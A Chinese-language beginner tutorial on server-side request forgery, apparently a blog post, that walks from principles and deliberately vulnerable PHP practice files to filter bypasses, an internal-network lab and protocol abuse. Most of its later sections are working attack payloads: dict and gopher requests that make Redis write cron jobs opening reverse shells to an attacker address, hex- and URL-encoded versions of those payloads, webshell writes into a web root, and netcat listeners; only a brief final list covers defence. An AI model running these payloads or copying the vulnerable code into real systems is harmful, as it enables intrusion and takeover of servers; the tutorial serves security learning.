# SSRF漏洞

> 前言:文章内容大致可分为原理详解-漏洞练习-利用协议攻击内网主机-> 防御方法。文章内容偏向于刚接触SSRF漏洞的师傅,是一篇对SSRF漏洞入门的手把手教学文章。文章特色在于对SSRF漏洞原理的详细分析以及一系列由简入深的SSRF漏洞练习到进阶实战和分析讲解。文章写作初衷是想借助REEBUF平台与入门安全的师傅分享自己入门期间的学习成果。最后特别感谢我的两位师傅的教导让我对于外网有了更深的理解。

## SSRF漏概述

    
    
    SSRF(服务器端请求伪造)是种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下SSRF攻击的目标是从外网无法访问的内部系统

## SSRF原理

    
    
    由于服务端提供了从其他服务器应⽤获取数据的功能，但没有对地址和协议等做过滤和限制。使得攻击者可以利⽤存在缺陷的web应⽤作为代理，攻击其远程和本地的服务器

  

代码审计中如何发现

    
    
    看到fsockopen方法就要注意,一般都是有三个参数:host,port,link,特别注意是link能控制的情况下就要高度重视

  

## SSRF能做的事情

    
    
    可以对外网服务器所在的内网、本地进行端口扫描务的banner信息  
    攻击运行在内网或者本地的应用程序  
    对内网web应用进行指纹识别，通过访问默认文件实现  
    攻击内外网的web应用。sql注入、struct2、redis等  
    利用file协议读取本地文件等

  

## SSRF相关函数

  * ### file_get_contents(把整个文件读入一个字符串中)

  * #### fsockopen

  * ### curl_exec

  

基础练习

file_get_contents函数相关代码配置

    
    
    <?php  
    if (isset($_GET['url'])) {                          //判断传进来的url是不是空,不是空则是true  
    $content = file_get_contents($_GET['url']);     //使用file_get_contents对传进来的文件名内容读入到字符串中赋给$content  
    $filename ='img1.jpg';                          //定义一个名为img1.jpg的图片filename变量  
    file_put_contents($filename, $content);            //将$content读入的文件内容写入到$filename图片里  
    //echo $_POST['url'];  
    $img = "< img src=\"".$filename."\"/>";             //使用img标签对图片进行路径拼接  
    }  
    echo $img;                                          //打印图片路径  
    ?>

![1682609436_644a951c71b143c4835a2.png!small?1682609436832](https://image.3001.net/images/20230427/1682609436_644a951c71b143c4835a2.png!small?1682609436832)

攻击

![1682609554_644a959272cd72da911c6.png!small?1682609554766](https://image.3001.net/images/20230427/1682609554_644a959272cd72da911c6.png!small?1682609554766)

去访问图片

![1682609536_644a95803db0d17173507.png!small?1682609536538](https://image.3001.net/images/20230427/1682609536_644a95803db0d17173507.png!small?1682609536538)

 **注意:使用file_get_contents读取文件一定要加上协议(http://)**

  

fsockopen代码相关配置

    
    
    function GetFile($host, $port, $link)  
    {  
    //fsockopen() 将返回一个文件句柄，之后可以被其他文件类函数调用  
    //（例如： fgets() ， fgetss() ，  
    // fwrite() ， fclose() 还有 feof() ）。如果调用失败，将返回 FALSE 。  
    $fp = fsockopen($host, intval($port), $errno, $errstr, 30);  
    if (!$fp) {  
        echo "$errstr (error number $errno) \n";  
    } else {  
        $out = "GET $link HTTP/1.1\r\n";  
        $out .= "Host: $host\r\n";  
        $out .= "Connection: Close\r\n\r\n";  
        $out .= "\r\n";  
        fwrite($fp, $out);  
        $contents = '';  
        while (! feof($fp)) {  
            $contents .= fgets($fp, 1024);  
        }  
        fclose($fp);  
        return $contents;  
    }  
    }  
    $host = $_GET['host'];  
    $port = $_GET['port'];  
    $link = $_GET['link'];  
    echo GetFile($host,$port,$link);

![1682609578_644a95aac1b1635270da5.png!small?1682609579132](https://image.3001.net/images/20230427/1682609578_644a95aac1b1635270da5.png!small?1682609579132)

有过滤的ssrf漏洞练习

如果有过滤的ssrf

    
    
    ​  
    if (isset($_GET['url'])){  
    $link = $_GET['url'];               //将URL参数的值用GET传输给$link  
    $pos = strpos($link,'www.baidu.com');  
    if($pos === false)  
    {  
        echo 'no';  
        die();  
    }  
    if (strpos($link,'127.0.0.1')!==false)  
    {  
        echo 'no';  
        die();  
    }  
    if (strpos($link,'localhost')!==false)  
    {  
        echo 'no';  
        die();  
    }  
    ​  
    $curlobj = curl_init();                         //初始化 curl 会话  
    curl_setopt($curlobj, CURLOPT_POST, 0);     //禁止用post提交数据  
    curl_setopt($curlobj,CURLOPT_URL,$link);        //需要获取的url地址  
    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);   //true 将curl_exec()获取的信息以字符串返回  
    $result=curl_exec($curlobj);                    //执行curl的会话  
    curl_close($curlobj);                           //关闭资源  
    ​  
    ​  
    echo $result;                               //打印结果  
    }

![1682609646_644a95ee9bb0aaabf3ce0.png!small?1682609646941](https://image.3001.net/images/20230427/1682609646_644a95ee9bb0aaabf3ce0.png!small?1682609646941)

    
    
    如果对方使用了白名单验证可以使用@绕过  
    如果对方加了多重判断,绕过本地换回口127.0.0.1可以使用@127。0。0。1绕过  
    也可以把ip地址转换成十进制跟十六进制(0x)也能绕过也能使用短链进行绕过

## 绕过waf检测

    
    
    .nip.io  
    .sslip.io  
    前面可以加一些字符来干扰waf

![1682609682_644a96129e84cbe75a5d5.png!small?1682609684271](https://image.3001.net/images/20230427/1682609682_644a96129e84cbe75a5d5.png!small?1682609684271)

  

waf方法绕过有很多,这里主要列举了几个方法来举例

  

  

  

## SSRF实战

实验 :

环境准备

> win10(攻击机) =>192.168.80.x
>
> win10(SSRF) =>192.168.80.x 10.10.10.x (两张网卡)
>
> win10(不出网主机) =>10.10.10.x (web服务)

思路

> win10可以访问 不出网的主机吗? => 不能访问 =>不知道有无开放web服务
>
> SSRF主机 能否访问 不出网的主机 ? => 可以访问
>
>  
>
>
> 例如 : hacker主机发现了 SSRF这台主机的 SSRF漏洞 , 是不是就意味着 SSRF这台主机可以 访问不出网的主机的web服务
>
>  
>
>
> 需求 : win10能够访问不出网主机的WEB服务
>
>  
>
>
> 实现 : 1 . 通过带有SSRF漏洞的这台主机 , 让他去访问 不出网主机的web服务 . 2 .
> 当带有SSRF漏洞的这台主机去访问了不出网主机的web服务后, 会自动保存图片到其根目录 3 . win10去访问这张图片 , 将内容解析出来 ,
> 是不是就实现了这个需求
>
>  
>
>
> 那么可以这样理解 : SSRF漏洞就是可以让我们去访问原本我们不能访问的内容

配置不出网网卡信息

![1682610119_644a97c7d34655d21605d.png!small?1682610120613](https://image.3001.net/images/20230427/1682610119_644a97c7d34655d21605d.png!small?1682610120613)

  

查看win10(SSRF)ip信息看看有没有配置

![1682610021_644a97654f1f468995bdb.png!small?1682610021697](https://image.3001.net/images/20230427/1682610021_644a97654f1f468995bdb.png!small?1682610021697)

可以发现配置成功我们再查看不出网主机ip信息

![1682610029_644a976d705dc2f6c6270.png!small?1682610029749](https://image.3001.net/images/20230427/1682610029_644a976d705dc2f6c6270.png!small?1682610029749)

可以发现配置成功我们在使用有漏洞的主机去尝试ping这台不出网的主机

![1682610039_644a977741e1f31e768da.png!small?1682610039742](https://image.3001.net/images/20230427/1682610039_644a977741e1f31e768da.png!small?1682610039742)

![1682610047_644a977f37945f1f7115b.png!small?1682610047663](https://image.3001.net/images/20230427/1682610047_644a977f37945f1f7115b.png!small?1682610047663)

可以ping通也能访问,再使用攻击机去ping和访问

![1682610135_644a97d7964550903239d.png!small?1682610135912](https://image.3001.net/images/20230427/1682610135_644a97d7964550903239d.png!small?1682610135912)

![1682610143_644a97df153f5cf4bbd0a.png!small?1682610143548](https://image.3001.net/images/20230427/1682610143_644a97df153f5cf4bbd0a.png!small?1682610143548)

可以发现是ping不通和不能访问的

开始使用SSRF漏洞攻击,先访问有漏洞的主机

![1682610151_644a97e7ab8ec7d9c04d4.png!small?1682610151989](https://image.3001.net/images/20230427/1682610151_644a97e7ab8ec7d9c04d4.png!small?1682610151989)

构造ssrf读取任意文件的payload

![1682610160_644a97f084602178379a6.png!small?1682610161094](https://image.3001.net/images/20230427/1682610160_644a97f084602178379a6.png!small?1682610161094)

读取成功,读取的内容会在一个jpg图片里保存在有漏洞的主机上

我们直接访问这个图片

![1682610175_644a97ff97d4f38a3641b.png!small?1682610176023](https://image.3001.net/images/20230427/1682610175_644a97ff97d4f38a3641b.png!small?1682610176023)

ctrl+s保存图片以txt文本保存读取

![1682610183_644a9807136b4813b09a7.png!small?1682610183436](https://image.3001.net/images/20230427/1682610183_644a9807136b4813b09a7.png!small?1682610183436)

读取成功

  

## SSRF漏洞利用协议

    
    
    dict协议  (字典协议,探测端口指纹信息,写入和反弹shell)  
    ​  
    file协议  (读取文件,如果遇到特殊字符使用filter以base64读取)  
    ​  
    http协议  (常用于file_get_contents函数)  
    ​  
    ftp协议   (扫描端口极其好用)  
    ​  
    gopher协议

### 利用协议进阶实战

### 用dict探测指纹信息

参数后面加上dict://127.0.0.1:端口

    
    
    dict://ip:port/命令:命令2:命令3

每个命令用冒号隔开 例

    
    
    dict://127.0.0.1:6379/set:passwd:123456  
    dict://127.0.0.1:6379/get:passwd

![1682610211_644a98236b97ff2fd7366.png!small?1682610211732](https://image.3001.net/images/20230427/1682610211_644a98236b97ff2fd7366.png!small?1682610211732)

##### 使用dict写入反弹shell

payload

    
    
    set  xx   "\n* * * * * bash -i >& /dev/tcp/192.168.146.130/7777 0>&1\n"  
    config set dir /var/spool/cron/  
    config set dbfilename root  
    bgsave

反弹shell的内容我们可以利用脚本编成16进制,再通过dict协议发送

使用python运行脚本

    
    
    \\x0a\\x0a\\x0a\\x0a\\x2a\\x20\\x2a\\x20\\x2a\\x20\\x2a\\x20\\x2a\\x20\\x20\\x62\\x61\\x73\\x68\\x20\\x2d\\x69\\x20\\x3e\\x26\\x20\\x2f\\x64\\x65\\x76\\x2f\\x74\\x63\\x70\\x2f\\x31\\x39\\x32\\x2e\\x31\\x36\\x38\\x2e\\x31\\x34\\x36\\x2e\\x31\\x33\\x30\\x2f\\x37\\x37\\x37\\x37\\x20\\x30\\x3e\\x26\\x31\\x0a\\x0a\\x0a\\x0a
    
    
    1 dict如果是通过curl发包，那么就需要两人反斜杠，并目在 头部 和 尾部 加上"  
    2 dict如果是通过浏览器发包，那么只需要一个反斜杠，并且在 头部 和 尾部 加上"  
    3 第二条开始只要是有空格的地方需要加上: 进行分割  
    4 反弹shel的命令中如果这个shel是写在/var/spool/cron这个文件夹下面那么 就要去掉反弹shell中的root,如果反弹shell的命令是写到/etc/crontab这个文件里面那么就不需要删除

浏览器发包:

    
    
    http://ip地址/ssrf.php?url=dict://127.0.0.1:6379/命令1:命令2:命令3

curl发包:

    
    
    curl dict://ip地址:端口/命令1:命令2:命令3

加上冒号的payload

    
    
    config:set:dir:/var/spool/cron/  
    config:set:dbfilename:root  
    bgsave

在有ssrf漏洞的地方直接一句一句写入

nc监听等待反弹shell

  

##### 写webshell

与反弹shell原理一样修改文件payload

    
    
    set tom "\n\n\n\n* * * * * <?php phpinfo();?>\n\n\n\n"  
    config set dir /www/admin/localhost_80/wwwroot/  
    config set dbfilename shell.php  
    save

进行构造

    
    
    把这一串用脚本编成十六进制"\n\n\n\n* * * * * <?php phpinfo();?>\n\n\n\n"  
    config:set:dir:/www/admin/localhost_80/wwwroot/  
    config:set:dbfilename:shell.php  
    bgsave

  

### 使用file协议读取文件（和文件包含协议一样的用法)

![1682610402_644a98e299c15427a7ead.png!small?1682610403075](https://image.3001.net/images/20230427/1682610402_644a98e299c15427a7ead.png!small?1682610403075)

?参数=file://绝对路径

  

### 使用ftp扫描端口实战

![1682610429_644a98fdb848d24be8f12.png!small?1682610430258](https://image.3001.net/images/20230427/1682610429_644a98fdb848d24be8f12.png!small?1682610430258)

我们可以使用bp爆破去探测端口,如果这个端口开启了网页就会很久才响应说明存在,要是不存在则会很快响应,说明端口不存在

抓包放到bp爆破模块

![1682610480_644a9930bcbe3f6c3cccf.png!small?1682610481220](https://image.3001.net/images/20230427/1682610480_644a9930bcbe3f6c3cccf.png!small?1682610481220)

![1682610505_644a99494d7c2cb41f809.png!small?1682610505694](https://image.3001.net/images/20230427/1682610505_644a99494d7c2cb41f809.png!small?1682610505694)

可以加载常用的端口字典,最好是设置线程,防止太快

![1682610521_644a99597f94dfc4994c1.png!small?1682610521777](https://image.3001.net/images/20230427/1682610521_644a99597f94dfc4994c1.png!small?1682610521777)

拿出我们的端口字典进行对比,出来快的这个端口就没有开启

  

  

### 使用gopher协议

    
    
    gopher协议 会默认用url编码  
    gopher:编码的注意事项(一定要放到bp编码)  
    ? 需要编码  
    空格 需要编码  
    在每个段落结束都需要加上%0d%0a  
    几个段得变成一行

练习ssrf.php文件

    
    
    <?php  
    if (isset($_GET['url'])) {                          //判断传进来的url是不是空,不是空则是true  
    $content = file_get_contents($_GET['url']);     //使用file_get_contents对传进来的文件名内容读入到字符串中赋给$content  
    $filename ='img1.jpg';                          //定义一个名为img1.jpg的图片filename变量  
    file_put_contents($filename, $content);            //将$content读入的文件内容写入到$filename图片里  
    //echo $_POST['url'];  
    $img = "< img src=\"".$filename."\"/>";             //使用img标签对图片进行路径拼接  
    }  
    echo $img;                                          //打印图片路径  
    echo 'this is gopher data'.@$_GET['url'];  
    ?>

##### GET数据包构造攻击

![1682610665_644a99e9db3b365f63030.png!small?1682610666347](https://image.3001.net/images/20230427/1682610665_644a99e9db3b365f63030.png!small?1682610666347)

传参可以发现内容打印到网页上尝试利用gopher攻击,bp抓包

![1682610701_644a9a0d7cbfb7e04659b.png!small?1682610701806](https://image.3001.net/images/20230427/1682610701_644a9a0d7cbfb7e04659b.png!small?1682610701806)

  

get请求攻击只需要一个请求跟主机,我们拿去编码

![1682610730_644a9a2a409b3ecc8441f.png!small?1682610730644](https://image.3001.net/images/20230427/1682610730_644a9a2a409b3ecc8441f.png!small?1682610730644)

编完注意要到记事本把编完码的payload放上去并且在每一行的后面加上%0d%0a,而且不能有换行要变成一行,最后也要在payload结尾加上一个%0d%0a

构造payload

    
    
    curl gopher://填要攻击的ip:要攻击的端口/_GET%20/ssrf.php%3fdata=gopher%20HTTP/1.1%0d%0aHost:%20192.168.1.103%0d%0a

加/_的意思是gopher协议会默认删掉一个,所以加上下划线是为了删掉不受影响

![1682610804_644a9a74a4746e9183d2f.png!small?1682610805037](https://image.3001.net/images/20230427/1682610804_644a9a74a4746e9183d2f.png!small?1682610805037)

使用kali用curl进行攻击,攻击成功,可以修改参数进行编码来攻击

  

> <?php  
> if (isset($_POST['url'])) { //判断传进来的url是不是空,不是空则是true  
> $content = file_get_contents($_GET['url']);
> //使用file_get_contents对传进来的文件名内容读入到字符串中赋给$content  
> $filename ='img1.jpg'; //定义一个名为img1.jpg的图片filename变量  
> file_put_contents($filename, $content); //将$content读入的文件内容写入到$filename图片里  
> //echo $_POST['url'];  
> $img = "< img src=\"".$filename."\"/>"; //使用img标签对图片进行路径拼接  
> }  
> echo $img; //打印图片路径  
> echo 'this is gopher data'.@$_POST['url'];  
> ?>

##### POST数据包构造攻击

传参抓包

![1682610870_644a9ab6363711f30253a.png!small?1682610870684](https://image.3001.net/images/20230427/1682610870_644a9ab6363711f30253a.png!small?1682610870684)

![1682610879_644a9abfe2e4b8333fe4d.png!small?1682610880295](https://image.3001.net/images/20230427/1682610879_644a9abfe2e4b8333fe4d.png!small?1682610880295)

进行编码

![1682610892_644a9acc5637acaa25353.png!small?1682610892671](https://image.3001.net/images/20230427/1682610892_644a9acc5637acaa25353.png!small?1682610892671)

删掉换行变成一行

构造payload

    
    
    curl gopher://填要攻击的ip:要攻击的端口/_POST%20/ssrf.php%20HTTP/1.1%0d%0aHost:%20192.168.1.103%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%2011%0d%0a%0d%0adata=gopher%0d%0a

和get一样的原理只是多了两个参数跟一个换行

进行攻击

![1682610906_644a9ada49f137ce5c8ed.png!small?1682610907007](https://image.3001.net/images/20230427/1682610906_644a9ada49f137ce5c8ed.png!small?1682610907007)

攻击成功

  

##### 使用gopher攻击redis数据库(对方数据库是能在外网访问)

首先我们要知道redis数据库是6379端口

流程

    
    
    本地安装redis测试连接然后使用语法创建key跟value

本地搭建redis数据库命令

    
    
    二 . 直接安装redis数据库  
    1 . yum install -y gcc  
    ​  
    2 . wget https://download.redis.io/releases/redis-6.2.6.tar.gz  
    ​  
    3 . tar -zxvf redis-6.2.6.tar.gz  
    ​  
    4 . cd redis-6.2.6  
    ​  
    5 . make  
    ​  
    6 . make install PREFIX=/usr/local/redis

注意启动要去这个目录下./去启动redis

数据库的语法

    
    
    创建值  
    set name tom  
    查看值  
    get name  
    删除值  
    del name

使用抓取tcp包命令抓取流量包,分析出redis数据包发送的格式来构造payload

    
    
    tcpdump -i eth0  port 6379  -w redis.pcap

先抓数据包再进行连接数据库输入语法进行分析

连接redis数据库命令

    
    
    redis-cli -h 192.168.146.149 -p 6379  
    -h 是主机ip  -p 是端口

![1682610940_644a9afc5e6e5576190ed.png!small?1682610940711](https://image.3001.net/images/20230427/1682610940_644a9afc5e6e5576190ed.png!small?1682610940711)

我们抓的包就有流量了,使用抓包工具wisk分析抓到的流量包 随便点击一个tcp的包右键点击追踪流点击追踪tcp包拉到最后面

    
    
    *3  =>  表示三个元素  
    $3  =>  表示三个字符  
    set  
    $4  =>  表示四个字符  
    name  
    $2  => 表示两个字符  
    ly  
    ​  
    +OK =>  成功就是OK      失败就是-1  
    ​  
    *2  =>表示两个元素  
    $3  =>  表示三个字符  
    get  
    $4  =>  表示四个字符  
    name

构造redis恶意数据包,注意

根据上面的格式来修改需要攻击的语句并且拿到bp进行全部URL编码复制到记事本把%0a全部替换成%0d%0a并且在结尾再加一个%0d%0a

  

全部编码完放在构造的恶意语句下划线后面进行拼接,利用_是因为gopher协议会默认减掉一个

    
    
    curl gopher://ip:6379/_

发送攻击请求,我们可以在redis里使用

MONITOR命令来查看我们的发送内容

![1682610961_644a9b112c40c486f714f.png!small?1682610961463](https://image.3001.net/images/20230427/1682610961_644a9b112c40c486f714f.png!small?1682610961463)

攻击成功

  

  

  

##### 利用ssrf漏洞实现redis反弹shell

两个位置可以反弹,

反弹shell的命令

    
    
    bash -i >& /dev/tcp/攻击者ip/端口 0>&1

  

一个是/etc下

    
    
    set tom "\n\n\n\n* * * * * root bash -i >& /dev/tcp/攻击机的ip/端口 0>&1\n\n\n\n"  
    config set dir /etc/  
    config set dbfilename crontab  
    save

一个是在/var/spool/cron/下

    
    
    set  xx   "\n* * * * * bash -i >& /dev/tcp/攻击机的ip/端口 0>&1\n"  
    config set dir /var/spool/cron/  
    config set dbfilename root  
    save

注意要把这些全部url编码并且在记事本里面把%0a全部换成%0d%0a,最后再加上一个%0d%0a

再使用

curl gopher://ip:6379/_

拼接使用kalli攻击

攻击之前一定要先开启端口监听

    
    
    nc -lvp 监听的端口

![1682611092_644a9b94c30625c6982de.png!small?1682611093096](https://image.3001.net/images/20230427/1682611092_644a9b94c30625c6982de.png!small?1682611093096)

发送请求等待,我们构造的是计划任务,上面的是每一分钟会执行一次反弹shell

![1682611099_644a9b9bbbf9f48322265.png!small?1682611100073](https://image.3001.net/images/20230427/1682611099_644a9b9bbbf9f48322265.png!small?1682611100073)

![1682611107_644a9ba39e46bb38e31d0.png!small?1682611108421](https://image.3001.net/images/20230427/1682611107_644a9ba39e46bb38e31d0.png!small?1682611108421)

等待反弹shell的成功

  

##### 使用http协议配合ssrf漏洞攻击内网redis数据库

###### 反弹shell

实验环境

    
    
    在真实环境中 我们找到了一个带有ssrf的网站，通过端口扫描发现一台只能本地访问的redis服务器  
    curl gopher通过SSRF写一个反弹shell

环境配置

安装小皮面板

1 . 安装小皮面板

    
    
    yum install -y wget && wget -O install.sh https://notdocker.xp.cn/install.sh && sh install.sh

2 . 登录小皮面板 => 开启apache服务 => 就在首页启动即可(其他不需要安装php已经自带有了)

3 . 安装redis服务

    
    
    1 . yum install -y gcc  
    ​  
    2 . wget https://download.redis.io/releases/redis-6.2.6.tar.gz  
    ​  
    3 . tar -zxvf redis-6.2.6.tar.gz  
    ​  
    4 . cd redis-6.2.6  
    ​  
    5 . make

安装完成之后把配置文件复制到src目录下并修改配置文件

![1682611135_644a9bbfbcd3427f0696e.png!small?1682611136090](https://image.3001.net/images/20230427/1682611135_644a9bbfbcd3427f0696e.png!small?1682611136090)

配置完启动redis

    
    
    ./redis-server redis.conf 

写一个ssrf漏洞的php文件

小皮的根目录

    
    
    /www/admin/localhost_80/wwwroot/

  

  

攻击流程

    
    
    构造一个反弹shell的语句,URL编码加上gopher的特性把%0a变成%0d%0a最后面加上%0d%0a,  
    构造完成之后进行二次URL编码,http特性会自动解一次码,  
    再通过构造的gohper协议的语句进行url编码最后拼接curl hllp://目标ip/ssrf php?url=gopher://127.0.0.1:6379/_  
    注意要对参数后面的gopher进行编码,因为http特性会自动解一次码把  :     //      /都编码  
    再使用ssrf的漏洞对redis进行跳板写入反弹shell

先把反弹的shell进行URL编码

    
    
    set  xx   "\n* * * * * bash -i >& /dev/tcp/攻击者的ip/端口 0>&1\n"  
    config set dir /var/spool/cron/  
    config set dbfilename root  
    save

![1682611159_644a9bd7ba919731c97c4.png!small?1682611160109](https://image.3001.net/images/20230427/1682611159_644a9bd7ba919731c97c4.png!small?1682611160109)

再把编码的东西%0a换成%0d%0a,最后再加上%0d%0a,加完之后再拿到bp进行第二次编码

![1682611167_644a9bdf6c448192c1c0b.png!small?1682611167750](https://image.3001.net/images/20230427/1682611167_644a9bdf6c448192c1c0b.png!small?1682611167750)

对参数的gopher协议进行编码

    
    
    gopher://127.0.0.1:6379/_

![1682611178_644a9beab5e4ca29857e5.png!small?1682611179099](https://image.3001.net/images/20230427/1682611178_644a9beab5e4ca29857e5.png!small?1682611179099)

编完码之后进行拼接

curl hllp://目标ip/ssrf php?url=

    
    
    curl http://目标ip/ssrf.php?url=gopher%3a%2f%2f127.0.0.1%3a6379%2f_

  

使用kali进行攻击

![1682611189_644a9bf581d70ce6559b1.png!small?1682611190023](https://image.3001.net/images/20230427/1682611189_644a9bf581d70ce6559b1.png!small?1682611190023)

  

等待计划任务的反弹shell

![1682611195_644a9bfb6f6f1fe6f0f2e.png!small?1682611195788](https://image.3001.net/images/20230427/1682611195_644a9bfb6f6f1fe6f0f2e.png!small?1682611195788)

成功

  

###### 写webshell

和反弹shell一样的原理我们只需要修改计划任务里的构造语句,使用http协议要进行二次编码

webshell的payload

    
    
    set tom "\n\n\n\n* * * * * <?php phpinfo();?>\n\n\n\n"  
    config set dir /www/admin/localhost_80/wwwroot/  
    config set dbfilename shell.php  
    save

  

## SSRF的防御

    
    
    1.统一错误信息，避免用户可以根据错误信息来判断远程服务器端口状态  
    2.限制请求的端口为HTTP常用的端口，比如80,443,8080.8088等  
    3.设置一个白名单,并且如果对方读取环回口地址立马终止运行  
    4.禁用不需要的协议，仅仅允许HTTP和HTTPS

  

  

